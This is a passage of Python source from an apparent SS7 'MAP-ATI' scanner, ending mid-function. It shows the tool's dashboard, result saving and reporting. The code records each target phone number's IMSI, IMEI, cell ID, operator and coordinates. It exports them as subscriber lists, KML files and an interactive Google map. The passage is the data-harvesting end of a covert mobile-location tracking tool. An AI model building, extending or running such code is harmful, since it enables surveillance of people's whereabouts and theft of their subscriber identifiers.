def get_map_error_description(error_code: int) -> str:
    """Get MAP error description"""
    map_errors = {
        1: "Unknown Subscriber",
        3: "Unknown MSC", 
        5: "Unidentified Subscriber",
        8: "Unknown Equipment",
        9: "Roaming Not Allowed",
        10: "Illegal Subscriber",
        11: "Bearer Service Not Provisioned",
        12: "Teleservice Not Provisioned", 
        13: "Illegal Equipment",
        14: "Call Barred",
        15: "Forwarding Violation",
        16: "CUG Reject",
        17: "Illegal SS Operation",
        18: "SS Error Status",
        19: "SS Not Available",
        20: "SS Subscription Violation",
        21: "SS Incompatibility",
        22: "Facility Not Supported",
        23: "No Handover Number Available",
        25: "Subsequent Handover Failure",
        26: "Absent Subscriber SM",
        27: "Absent Subscriber",
        28: "Subscriber Busy For MT SMS",
        29: "SM Delivery Failure",
        30: "Message Waiting List Full",
        31: "System Failure",
        32: "Data Missing",
        33: "Unexpected Data Value",
        34: "PW Registration Failure",
        35: "Negative PW Check",
        36: "No Roaming Number Available",
        37: "Tracing Buffer Full",
        39: "Target Cell Outside Group Call Area",
        40: "Number Of PW Attempts Violation",
        41: "Number Changed",
        42: "Busy Subscriber",
        43: "No Subscriber Reply",
        44: "Forwarding Failed",
        45: "OR Not Allowed",
        46: "ATI Not Allowed",
        47: "No Group Call Number Available",
        48: "Resource Limitation",
        49: "Unauthorized Requesting Network",
        50: "Unauthorized LCS Client",
        51: "Position Method Failure",
        52: "Unknown Or Unreachable LCS Client",
        53: "MM Event Not Supported",
        54: "ATSI Not Allowed",
        55: "ATM Not Allowed",
        56: "Information Not Available"
    }
    
    return map_errors.get(error_code, f"Unknown MAP Error ({error_code})")

# ================================
# PROFESSIONAL UI DASHBOARD
# ================================

class ProfessionalDashboard:
    """Professional Rich-based dashboard for real-time monitoring"""
    
    def __init__(self):
        if not RICH_AVAILABLE:
            self.console = None
            return
            
        self.console = Console()
        self.layout = Layout()
        self.setup_layout()
        self.scan_stats = {
            'total': 0,
            'completed': 0,
            'successful': 0,
            'failed': 0,
            'locations_found': 0,
            'imsi_extracted': 0,
            'operators_found': set(),
            'countries_found': set(),
            'recent_activity': [],
            'start_time': time.time(),
            'scan_rate': 0.0,
            'eta': '0m 0s'
        }
    
    def setup_layout(self):
        """Setup professional dashboard layout"""
        if not self.console:
            return
            
        # Main layout structure
        self.layout.split_column(
            Layout(name="header", size=4),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=3)
        )
        
        # Main area split
        self.layout["main"].split_row(
            Layout(name="left", ratio=2),
            Layout(name="right", ratio=1)
        )
        
        # Left side split
        self.layout["left"].split_column(
            Layout(name="progress", size=10),
            Layout(name="activity", ratio=1)
        )
        
        # Right side split
        self.layout["right"].split_column(
            Layout(name="stats", ratio=1),
            Layout(name="locations", ratio=1),
            Layout(name="operators", ratio=1)
        )
    
    def update_stats(self, result: EnhancedScanResult):
        """Update dashboard statistics"""
        self.scan_stats['completed'] += 1
        
        if result.result == ScanResult.SUCCESS:
            self.scan_stats['successful'] += 1
            
            # Count extracted data
            if result.subscriber_info.imsi:
                self.scan_stats['imsi_extracted'] += 1
            
            if result.location_info.mcc and result.location_info.mnc:
                self.scan_stats['locations_found'] += 1
                
                if result.location_info.operator_name:
                    self.scan_stats['operators_found'].add(result.location_info.operator_name)
                
                if result.location_info.country:
                    self.scan_stats['countries_found'].add(result.location_info.country)
        else:
            self.scan_stats['failed'] += 1
        
        # Update recent activity
        activity = {
            'ip': result.target.ip,
            'port': result.target.port,
            'msisdn': result.target.msisdn,
            'status': result.result.value,
            'time': time.time(),
            'info': ''
        }
        
        if result.result == ScanResult.SUCCESS:
            if result.location_info.operator_name:
                activity['info'] = f"{result.location_info.operator_name}"
            if result.location_info.country:
                activity['info'] += f" ({result.location_info.country})"
        else:
            activity['info'] = result.error_message[:30]
        
        self.scan_stats['recent_activity'].append(activity)
        if len(self.scan_stats['recent_activity']) > 15:
            self.scan_stats['recent_activity'].pop(0)
        
        # Calculate scan rate and ETA
        elapsed = time.time() - self.scan_stats['start_time']
        if elapsed > 0:
            self.scan_stats['scan_rate'] = self.scan_stats['completed'] / elapsed
            
            remaining = self.scan_stats['total'] - self.scan_stats['completed']
            if self.scan_stats['scan_rate'] > 0:
                eta_seconds = remaining / self.scan_stats['scan_rate']
                eta_minutes = int(eta_seconds // 60)
                eta_secs = int(eta_seconds % 60)
                self.scan_stats['eta'] = f"{eta_minutes}m {eta_secs}s"
    
    def render(self):
        """Render the dashboard"""
        if not self.console or not RICH_AVAILABLE:
            return
        
        # Header
        self.layout["header"].update(Panel(
            Align.center(
                f"[bold cyan]🎯 MAP-ATI PROFESSIONAL SCANNER v{VERSION}[/bold cyan]\n" +
                f"[green]Scan ID: {SCAN_ID}[/green] | " +
                f"[yellow]Build: {BUILD_DATE}[/yellow] | " +
                f"[blue]Author: {AUTHOR}[/blue]"
            ),
            style="cyan",
            box=box.DOUBLE_EDGE
        ))
        
        # Progress section
        progress_table = Table(show_header=False, box=None, padding=(0, 1))
        progress_table.add_column(style="cyan", width=50)
        progress_table.add_column(style="magenta", width=25)
        
        if self.scan_stats['total'] > 0:
            progress_pct = (self.scan_stats['completed'] / self.scan_stats['total']) * 100
            progress_bar = "█" * int(progress_pct / 2) + "░" * (50 - int(progress_pct / 2))
            
            progress_table.add_row(
                f"Progress: {progress_bar} {progress_pct:.1f}%",
                f"({self.scan_stats['completed']}/{self.scan_stats['total']})"
            )
            progress_table.add_row(
                f"Speed: {self.scan_stats['scan_rate']:.1f} targets/sec",
                f"ETA: {self.scan_stats['eta']}"
            )
            progress_table.add_row(
                f"Success Rate: {(self.scan_stats['successful']/max(1,self.scan_stats['completed']))*100:.1f}%",
                f"Data Found: {self.scan_stats['imsi_extracted']}"
            )
        
        self.layout["progress"].update(Panel(
            progress_table, 
            title="📊 Scan Progress", 
            border_style="green"
        ))
        
        # Statistics
        stats_table = Table(show_header=False, box=None)
        stats_table.add_column(style="green", width=20)
        stats_table.add_column(style="red", width=15)
        
        stats_table.add_row(
            f"✅ Successful: {self.scan_stats['successful']}",
            f"❌ Failed: {self.scan_stats['failed']}"
        )
        stats_table.add_row(
            f"🌍 Locations: {self.scan_stats['locations_found']}",
            f"📱 IMSI: {self.scan_stats['imsi_extracted']}"
        )
        stats_table.add_row(
            f"🏢 Operators: {len(self.scan_stats['operators_found'])}",
            f"🌐 Countries: {len(self.scan_stats['countries_found'])}"
        )
        
        self.layout["stats"].update(Panel(
            stats_table,
            title="📈 Statistics",
            border_style="blue"
        ))
        
        # Recent Activity
        activity_table = Table(show_header=True, box=None)
        activity_table.add_column("Target", style="cyan", width=20)
        activity_table.add_column("Result", style="green", width=10)
        activity_table.add_column("Info", style="yellow", width=25)
        
        for activity in self.scan_stats['recent_activity'][-8:]:
            status_icon = "✅" if activity['status'] == 'success' else "❌"
            activity_table.add_row(
                f"{activity['ip']}:{activity['port']}",
                f"{status_icon} {activity['status'][:8]}",
                activity['info'][:25]
            )
        
        self.layout["activity"].update(Panel(
            activity_table,
            title="🚀 Recent Activity",
            border_style="cyan"
        ))
        
        # Discovered Locations
        locations_table = Table(show_header=True, box=None)
        locations_table.add_column("Country", style="green", width=15)
        locations_table.add_column("Count", style="yellow", width=5)
        
        country_counts = {}
        for activity in self.scan_stats['recent_activity']:
            if 'Country' in activity.get('info', ''):
                country = activity['info'].split('(')[1].split(')')[0] if '(' in activity['info'] else 'Unknown'
                country_counts[country] = country_counts.get(country, 0) + 1
        
        for country, count in sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:6]:
            locations_table.add_row(country[:15], str(count))
        
        self.layout["locations"].update(Panel(
            locations_table,
            title="🌍 Countries",
            border_style="magenta"
        ))
        
        # Discovered Operators
        operators_table = Table(show_header=True, box=None)
        operators_table.add_column("Operator", style="blue", width=20)
        
        for operator in sorted(list(self.scan_stats['operators_found']))[:6]:
            operators_table.add_row(operator[:20])
        
        self.layout["operators"].update(Panel(
            operators_table,
            title="🏢 Operators",
            border_style="blue"
        ))
        
        # Footer
        self.layout["footer"].update(Panel(
            "[bold]Professional Controls:[/bold] [cyan]Ctrl+C[/cyan] Stop | " +
            "[cyan]Ctrl+S[/cyan] Save Results | [cyan]Ctrl+R[/cyan] Generate Report",
            style="dim"
        ))

# ================================
# ENHANCED FILE OPERATIONS & EXPORT
# ================================

def create_professional_output_structure(scan_id: str) -> Path:
    """Create professional output directory structure"""
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = Path(f"results/professional_scan_{scan_id}_{timestamp}")
    
    # Create comprehensive directory structure
    directories = [
        base_dir / "successful_results",
        base_dir / "failed_results", 
        base_dir / "extracted_data" / "locations",
        base_dir / "extracted_data" / "subscribers",
        base_dir / "extracted_data" / "operators",
        base_dir / "raw_data" / "tcap_responses",
        base_dir / "raw_data" / "map_responses", 
        base_dir / "raw_data" / "sccp_responses",
        base_dir / "reports" / "html",
        base_dir / "reports" / "json",
        base_dir / "reports" / "csv",
        base_dir / "exports" / "google_maps",
        base_dir / "logs",
        base_dir / "statistics"
    ]
    
    for directory in directories:
        directory.mkdir(parents=True, exist_ok=True)
    
    # Create info file
    info_file = base_dir / "scan_info.json"
    scan_info = {
        'scan_id': scan_id,
        'timestamp': timestamp,
        'scanner_version': VERSION,
        'build_date': BUILD_DATE,
        'author': AUTHOR,
        'directory_structure': [str(d.relative_to(base_dir)) for d in directories]
    }
    
    with open(info_file, 'w', encoding='utf-8') as f:
        json.dump(scan_info, f, indent=2)
    
    logger.info(f"Professional output structure created: {base_dir}")
    return base_dir

def save_results_comprehensive_professional(results: List[EnhancedScanResult], base_dir: Path):
    """Save results with comprehensive professional organization"""
    
    try:
        logger.info(f"Saving {len(results)} results to professional structure")
        
        # Classify results
        successful_results = [r for r in results if r.result == ScanResult.SUCCESS]
        failed_results = [r for r in results if r.result != ScanResult.SUCCESS]
        
        # Save successful results with full data
        successful_file = base_dir / "successful_results" / "complete_data.json"
        successful_data = []
        
        for result in successful_results:
            result_dict = asdict(result)
            # Convert bytes to hex for JSON serialization
            if result_dict['response_data']:
                result_dict['response_data_hex'] = result.response_data.hex()
                result_dict['response_data'] = None
            successful_data.append(result_dict)
        
        with open(successful_file, 'w', encoding='utf-8') as f:
            json.dump(successful_data, f, indent=2, default=str, ensure_ascii=False)
        
        # Save failed results with analysis
        failed_file = base_dir / "failed_results" / "failure_analysis.json"
        failed_data = []
        
        for result in failed_results:
            result_dict = asdict(result)
            if result_dict['response_data']:
                result_dict['response_data_hex'] = result.response_data.hex()
                result_dict['response_data'] = None
            failed_data.append(result_dict)
        
        with open(failed_file, 'w', encoding='utf-8') as f:
            json.dump(failed_data, f, indent=2, default=str, ensure_ascii=False)
        
        # Extract and save location data
        save_location_data_professional(successful_results, base_dir / "extracted_data" / "locations")
        
        # Extract and save subscriber data  
        save_subscriber_data_professional(successful_results, base_dir / "extracted_data" / "subscribers")
        
        # Extract and save operator data
        save_operator_data_professional(successful_results, base_dir / "extracted_data" / "operators")
        
        # Save raw protocol data
        save_raw_protocol_data(results, base_dir / "raw_data")
        
        # Generate comprehensive reports
        generate_professional_reports(results, base_dir / "reports")
        
        # Create Google Maps data
        create_google_maps_export(successful_results, base_dir / "exports" / "google_maps")
        
        # Generate statistics
        generate_comprehensive_statistics(results, base_dir / "statistics")
        
        logger.info("Professional results saved successfully")
        
    except Exception as e:
        logger.error(f"Failed to save professional results: {e}")
        raise

def save_location_data_professional(results: List[EnhancedScanResult], output_dir: Path):
    """Save comprehensive location data"""
    
    location_data = []
    unique_locations = {}
    
    for result in results:
        if result.location_info.mcc and result.location_info.mnc:
            location_key = f"{result.location_info.mcc}-{result.location_info.mnc}-{result.location_info.lac}-{result.location_info.cell_id}"
            
            if location_key not in unique_locations:
                location_entry = {
                    'location_id': location_key,
                    'mcc': result.location_info.mcc,
                    'mnc': result.location_info.mnc, 
                    'lac': result.location_info.lac,
                    'cell_id': result.location_info.cell_id,
                    'operator_name': result.location_info.operator_name,
                    'country': result.location_info.country,
                    'technology': result.location_info.technology,
                    'coordinates': result.location_info.coordinates,
                    'google_maps_url': result.location_info.google_maps_url,
                    'address': result.location_info.address,
                    'city': result.location_info.city,
                    'vlr_number': result.location_info.vlr_number,
                    'msc_number': result.location_info.msc_number,
                    'first_discovered': result.timestamp,
                    'associated_targets': [str(result.target)],
                    'raw_cgi': result.location_info.raw_cgi
                }
                unique_locations[location_key] = location_entry
                location_data.append(location_entry)
            else:
                # Add to associated targets
                unique_locations[location_key]['associated_targets'].append(str(result.target))
    
    # Save locations JSON
    locations_file = output_dir / "discovered_locations.json"
    with open(locations_file, 'w', encoding='utf-8') as f:
        json.dump(location_data, f, indent=2, default=str, ensure_ascii=False)
    
    # Save locations CSV
    locations_csv = output_dir / "discovered_locations.csv"
    if location_data:
        with open(locations_csv, 'w', newline='', encoding='utf-8') as f:
            fieldnames = ['location_id', 'mcc', 'mnc', 'lac', 'cell_id', 'operator_name', 
                         'country', 'coordinates', 'google_maps_url', 'address', 'city']
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for location in location_data:
                row = {k: location.get(k, '') for k in fieldnames}
                if location.get('coordinates'):
                    row['coordinates'] = f"{location['coordinates'][0]}, {location['coordinates'][1]}"
                writer.writerow(row)
    
    logger.info(f"Saved {len(location_data)} unique locations")

def save_subscriber_data_professional(results: List[EnhancedScanResult], output_dir: Path):
    """Save comprehensive subscriber data"""
    
    subscriber_data = []
    
    for result in results:
        if result.subscriber_info.imsi or result.subscriber_info.imei:
            subscriber_entry = {
                'target': str(result.target),
                'imsi': result.subscriber_info.imsi,
                'msisdn': result.target.msisdn,
                'imei': result.subscriber_info.imei,
                'subscriber_state': result.subscriber_info.subscriber_state,
                'equipment_status': result.subscriber_info.equipment_status,
                'hlr_number': result.subscriber_info.hlr_number,
                'location_info': {
                    'mcc': result.location_info.mcc,
                    'mnc': result.location_info.mnc,
                    'lac': result.location_info.lac,
                    'cell_id': result.location_info.cell_id,
                    'operator': result.location_info.operator_name,
                    'country': result.location_info.country
                },
                'discovery_time': result.timestamp,
                'scan_id': result.scan_id
            }
            subscriber_data.append(subscriber_entry)
    
    # Save subscribers JSON
    subscribers_file = output_dir / "discovered_subscribers.json"
    with open(subscribers_file, 'w', encoding='utf-8') as f:
        json.dump(subscriber_data, f, indent=2, default=str, ensure_ascii=False)
    
    # Save subscribers CSV
    subscribers_csv = output_dir / "discovered_subscribers.csv"
    if subscriber_data:
        with open(subscribers_csv, 'w', newline='', encoding='utf-8') as f:
            fieldnames = ['target', 'imsi', 'msisdn', 'imei', 'subscriber_state', 
                         'equipment_status', 'operator', 'country', 'discovery_time']
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            
            for subscriber in subscriber_data:
                row = {
                    'target': subscriber['target'],
                    'imsi': subscriber['imsi'],
                    'msisdn': subscriber['msisdn'], 
                    'imei': subscriber['imei'],
                    'subscriber_state': subscriber['subscriber_state'],
                    'equipment_status': subscriber['equipment_status'],
                    'operator': subscriber['location_info']['operator'],
                    'country': subscriber['location_info']['country'],
                    'discovery_time': subscriber['discovery_time']
                }
                writer.writerow(row)
    
    logger.info(f"Saved {len(subscriber_data)} subscriber records")

def save_operator_data_professional(results: List[EnhancedScanResult], output_dir: Path):
    """Save comprehensive operator intelligence data"""
    
    operator_stats = {}
    
    for result in results:
        if result.location_info.operator_name:
            operator_key = f"{result.location_info.mcc}-{result.location_info.mnc}"
            
            if operator_key not in operator_stats:
                operator_stats[operator_key] = {
                    'mcc': result.location_info.mcc,
                    'mnc': result.location_info.mnc,
                    'operator_name': result.location_info.operator_name,
                    'country': result.location_info.country,
                    'technology': result.location_info.technology,
                    'cells_discovered': set(),
                    'lacs_discovered': set(),
                    'targets_found': [],
                    'first_seen': result.timestamp,
                    'last_seen': result.timestamp
                }
            
            stats = operator_stats[operator_key]
            stats['cells_discovered'].add(f"{result.location_info.lac}-{result.location_info.cell_id}")
            stats['lacs_discovered'].add(str(result.location_info.lac))
            stats['targets_found'].append(str(result.target))
            stats['last_seen'] = result.timestamp
    
    # Convert sets to lists for JSON serialization
    operator_data = []
    for operator_key, stats in operator_stats.items():
        operator_entry = {
            'plmn_id': operator_key,
            'mcc': stats['mcc'],
            'mnc': stats['mnc'],
            'operator_name': stats['operator_name'],
            'country': stats['country'],
            'technology': stats['technology'],
            'cells_count': len(stats['cells_discovered']),
            'lacs_count': len(stats['lacs_discovered']),
            'targets_count': len(stats['targets_found']),
            'cells_discovered': list(stats['cells_discovered']),
            'lacs_discovered': list(stats['lacs_discovered']),
            'targets_found': stats['targets_found'],
            'first_seen': stats['first_seen'],
            'last_seen': stats['last_seen']
        }
        operator_data.append(operator_entry)
    
    # Save operator intelligence
    operators_file = output_dir / "operator_intelligence.json"
    with open(operators_file, 'w', encoding='utf-8') as f:
        json.dump(operator_data, f, indent=2, default=str, ensure_ascii=False)
    
    logger.info(f"Saved intelligence for {len(operator_data)} operators")

def create_google_maps_export(results: List[EnhancedScanResult], output_dir: Path):
    """Create Google Maps export files"""
    
    if not HTML_REPORTS_AVAILABLE:
        logger.warning("HTML reports not available - skipping Google Maps export")
        return
    
    # Collect location data for mapping
    map_data = []
    
    for result in results:
        if result.location_info.coordinates:
            lat, lon = result.location_info.coordinates
            map_entry = {
                'latitude': lat,
                'longitude': lon,
                'title': f"{result.location_info.operator_name}",
                'description': f"Cell: {result.location_info.mcc}-{result.location_info.mnc}-{result.location_info.lac}-{result.location_info.cell_id}",
                'target': str(result.target),
                'imsi': result.subscriber_info.imsi,
                'country': result.location_info.country,
                'city': result.location_info.city
            }
            map_data.append(map_entry)
    
    # Create KML file for Google Earth
    kml_content = '''<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>MAP-ATI Scan Results</name>
    <description>Discovered cellular locations from MAP-ATI scan</description>
'''
    
    for location in map_data:
        kml_content += f'''
    <Placemark>
      <name>{location['title']}</name>
      <description>
        <![CDATA[
          <b>Target:</b> {location['target']}<br/>
          <b>Cell:</b> {location['description']}<br/>
          <b>IMSI:</b> {location['imsi']}<br/>
          <b>Location:</b> {location['city']}, {location['country']}
        ]]>
      </description>
      <Point>
        <coordinates>{location['longitude']},{location['latitude']},0</coordinates>
      </Point>
    </Placemark>'''
    
    kml_content += '''
  </Document>
</kml>'''
    
    # Save KML file
    kml_file = output_dir / "discovered_locations.kml"
    with open(kml_file, 'w', encoding='utf-8') as f:
        f.write(kml_content)
    
    # Create HTML map
    html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>MAP-ATI Scan Results - Interactive Map</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <style>
        #map { height: 600px; }
        .info-box { padding: 10px; background: #f8f9fa; margin: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="info-box">
        <h1>🎯 MAP-ATI Professional Scanner - Discovered Locations</h1>
        <p><strong>Scan ID:</strong> ''' + SCAN_ID + '''</p>
        <p><strong>Total Locations:</strong> ''' + str(len(map_data)) + '''</p>
        <p><strong>Generated:</strong> ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC") + '''</p>
    </div>
    <div id="map"></div>
    
    <script>
        var map = L.map('map').setView([20, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);
        
        var locations = ''' + json.dumps(map_data) + ''';
        
        locations.forEach(function(location) {
            var marker = L.marker([location.latitude, location.longitude]).addTo(map);
            marker.bindPopup('<b>' + location.title + '</b><br/>' + 
                           location.description + '<br/>' +
                           'Target: ' + location.target + '<br/>' +
                           'IMSI: ' + location.imsi);
        });
        
        if (locations.length > 0) {
            var group = new L.featureGroup(map._layers);
            map.fitBounds(group.getBounds().pad(0.1));
        }
    </script>
</body>
</html>'''
    
    # Save HTML map
    html_file = output_dir / "interactive_map.html"
    with open(html_file, 'w', encoding='utf-8') as f:
        f.write(html_template)
    
    # Create CSV for Google My Maps import
    csv_file = output_dir / "google_my_maps_import.csv"
    with open(csv_file, 'w', newline='', encoding='utf-8') as f:
        fieldnames = ['Name', 'Description', 'Latitude', 'Longitude', 'Target', 'IMSI', 'Country']
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        
        for location in map_data:
            writer.writerow({
                'Name': location['title'],
                'Description': location['description'],
                'Latitude': location['latitude'],
                'Longitude': location['longitude'],
                'Target': location['target'],
                'IMSI': location['imsi'],
                'Country': location['country']
            })
    
    logger.info(f"Google Maps export created with {len(map_data)} locations")

def generate_professional_reports(results: List[EnhancedScanResult], output_dir: Path):
    """Generate comprehensive professional reports"""
    
    try:
        # Generate HTML report
        generate_html_report_professional(results, output_dir / "html" / "comprehensive_report.html")
        
        # Generate JSON summary
        generate_json_summary_report(results, output_dir / "json" / "scan_summary.json")
        
        # Generate CSV exports
        generate_csv_reports(results, output_dir / "csv")
        
        logger.info("Professional reports generated successfully")
        
    except Exception as e:
        logger.error(f"Report generation failed: {e}")

def generate_html_report_professional(results: List[EnhancedScanResult], output_file: Path):
    """Generate comprehensive HTML report"""
    
    if not HTML_REPORTS_AVAILABLE:
        logger.warning("HTML reports not available")
        return
    
    # Analyze results for report
    successful_results = [r for r in results if r.result == ScanResult.SUCCESS]
    failed_results = [r for r in results if r.result != ScanResult.SUCCESS]
    
    # Extract statistics
    stats = {
        'total_scans': len(results),
        'successful_scans': len(successful_results),
        'failed_scans': len(failed_results),
        'success_rate': (len(successful_results) / len(results) * 100) if results else 0,
        'imsi_extracted': sum(1 for r in successful_results if r.subscriber_info.imsi),
        'locations_found': sum(1 for r in successful_results if r.location_info.mcc),
        'unique_operators': len(set(r.location_info.operator_name for r in successful_results if r.location_info.operator_name)),
        'unique_countries': len(set(r.location_info.country for r in successful_results if r.location_info.country))
    }
    
    html_template = Template('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAP-ATI Professional Scan Report</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        .header h1 { margin: 0; font-size: 2.5em; }
        .header p { margin: 10px 0; opacity: 0.9; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .stat-card h3 { margin: 0 0 10px 0; color: #333; }
        .stat-number { font-size: 2em; font-weight: bold; color: #667eea; }
        .section { background: white; padding: 25px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .section h2 { margin-top: 0; color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f8f9fa; font-weight: 600; }
        .success { color: #28a745; font-weight: bold; }
        .failure { color: #dc3545; font-weight: bold; }
        .progress-bar { width: 100%; height: 20px; background: #e9ecef; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); }
        .location-card { border: 1px solid #dee2e6; border-radius: 5px; padding: 15px; margin: 10px 0; }
        .location-card h4 { margin: 0 0 10px 0; color: #495057; }
        .badge { padding: 3px 8px; border-radius: 12px; font-size: 0.8em; font-weight: bold; }
        .badge-success { background: #d4edda; color: #155724; }
        .badge-info { background: #d1ecf1; color: #0c5460; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎯 MAP-ATI Professional Scan Report</h1>
        <p><strong>Scan ID:</strong> {{ scan_id }}</p>
        <p><strong>Generated:</strong> {{ timestamp }}</p>
        <p><strong>Scanner Version:</strong> {{ version }}</p>
        <p><strong>Author:</strong> {{ author }}</p>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <h3>Total Scans</h3>
            <div class="stat-number">{{ stats.total_scans }}</div>
        </div>
        <div class="stat-card">
            <h3>Success Rate</h3>
            <div class="stat-number">{{ "%.1f"|format(stats.success_rate) }}%</div>
            <div class="progress-bar">
                <div class="progress-fill" style="width: {{ stats.success_rate }}%"></div>
            </div>
        </div>
        <div class="stat-card">
            <h3>IMSI Extracted</h3>
            <div class="stat-number">{{ stats.imsi_extracted }}</div>
        </div>
        <div class="stat-card">
            <h3>Locations Found</h3>
            <div class="stat-number">{{ stats.locations_found }}</div>
        </div>
        <div class="stat-card">
            <h3>Operators Discovered</h3>
            <div class="stat-number">{{ stats.unique_operators }}</div>
        </div>
        <div class="stat-card">
            <h3>Countries Identified</h3>
            <div class="stat-number">{{ stats.unique_countries }}</div>
        </div>
    </div>
    
    <div class="section">
        <h2>📊 Scan Results Summary</h2>
        <table>
            <tr>
                <th>Result Type</th>
                <th>Count</th>
                <th>Percentage</th>
            </tr>
            <tr>
                <td class="success">✅ Successful</td>
                <td>{{ stats.successful_scans }}</td>
                <td>{{ "%.1f"|format(stats.success_rate) }}%</td>
            </tr>
            <tr>
                <td class="failure">❌ Failed</td>
                <td>{{ stats.failed_scans }}</td>
                <td>{{ "%.1f"|format(100 - stats.success_rate) }}%</td>
            </tr>
        </table>
    </div>
    
    <div class="section">
        <h2>🌍 Discovered Locations</h2>
        {% for result in successful_results[:10] %}
        {% if result.location_info.mcc %}
        <div class="location-card">
            <h4>{{ result.location_info.operator_name or "Unknown Operator" }}</h4>
            <p><strong>Location:</strong> {{ result.location_info.country }}, {{ result.location_info.city }}</p>
            <p><strong>Cell ID:</strong> {{ result.location_info.mcc }}-{{ result.location_info.mnc }}-{{ result.location_info.lac }}-{{ result.location_info.cell_id }}</p>
            <p><strong>Target:</strong> {{ result.target.ip }}:{{ result.target.port }} → {{ result.target.msisdn }}</p>
            {% if result.subscriber_info.imsi %}
            <p><strong>IMSI:</strong> <span class="badge badge-success">{{ result.subscriber_info.imsi }}</span></p>
            {% endif %}
            {% if result.location_info.google_maps_url %}
            <p><a href="{{ result.location_info.google_maps_url }}" target="_blank">📍 View on Google Maps</a></p>
            {% endif %}
        </div>
        {% endif %}
        {% endfor %}
    </div>
    
    <div class="section">
        <h2>📱 Extracted Subscriber Data</h2>
        <table>
            <tr>
                <th>Target</th>
                <th>IMSI</th>
                <th>IMEI</th>
                <th>State</th>
                <th>Operator</th>
                <th>Country</th>
            </tr>
            {% for result in successful_results %}
            {% if result.subscriber_info.imsi %}
            <tr>
                <td>{{ result.target.msisdn }}</td>
                <td><span class="badge badge-success">{{ result.subscriber_info.imsi }}</span></td>
                <td>{{ result.subscriber_info.imei or "N/A" }}</td>
                <td>{{ result.subscriber_info.subscriber_state or "Unknown" }}</td>
                <td>{{ result.location_info.operator_name or "Unknown" }}</td>
                <td>{{ result.location_info.country or "Unknown" }}</td>
            </tr>
            {% endif %}
            {% endfor %}
        </table>
    </div>
    
    <div class="section">
        <h2>❌ Failed Scans Analysis</h2>
        <table>
            <tr>
                <th>Target</th>
                <th>Failure Reason</th>
                <th>Error Message</th>
                <th>Response Time</th>
            </tr>
            {% for result in failed_results[:20] %}
            <tr>
                <td>{{ result.target.ip }}:{{ result.target.port }}</td>
                <td><span class="badge badge-info">{{ result.result.value }}</span></td>
                <td>{{ result.error_message[:50] }}...</td>
                <td>{{ "%.0f"|format(result.response_time_ms) }}ms</td>
            </tr>
            {% endfor %}
        </table>
    </div>
    
    <div class="section">
        <h2>🔧 Technical Details</h2>
        <p><strong>Scanner Version:</strong> {{ version }}</p>
        <p><strong>Build Date:</strong> {{ build_date }}</p>
        <p><strong>Protocol Analysis:</strong> Complete TCAP/MAP analysis with Pycrate</p>
        <p><strong>Location Services:</strong> Google Maps integration enabled</p>
        <p><strong>Export Formats:</strong> JSON, CSV, KML, HTML</p>
    </div>
</body>
</html>
    ''')
    
    # Render and save HTML
    html_content = html_template.render(
        scan_id=SCAN_ID,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
        version=VERSION,
        author=AUTHOR,
        build_date=BUILD_DATE,
        stats=stats,
        successful_results=successful_results,
        failed_results=failed_results
    )
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    logger.info(f"HTML report generated: {output_file}")

def generate_comprehensive_statistics(results: List[EnhancedScanResult], output_dir: Path):
    """Generate comprehensive scan statistics"""
    
    stats = {
        'scan_metadata': {
            'scan_id': SCAN_ID,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'scanner_version': VERSION,
            'total_targets': len(results),
            'scan_duration': 0  # Will be calculated
        },
        'result_breakdown': {},
        'operator_statistics': {},
        'country_statistics': {},
        'technology_statistics': {},
        'response_time_analysis': {},
        'data_extraction_stats': {
            'imsi_extracted': 0,
            'imei_extracted': 0,
            'locations_found': 0,
            'vlr_numbers_found': 0,
            'msc_numbers_found': 0
        },
        'protocol_analysis_stats': {
            'tcap_analysis_success': 0,
            'map_analysis_success': 0,
            'successful_extractions': 0
        }
    }
    
    # Analyze results
    response_times = []
    
    for result in results:
        # Result breakdown
        result_type = result.result.value
        stats['result_breakdown'][result_type] = stats['result_breakdown'].get(result_type, 0) + 1
        
        # Response time analysis
        if result.response_time_ms > 0:
            response_times.append(result.response_time_ms)
        
        # Protocol analysis stats
        if result.tcap_analysis.analysis_success:
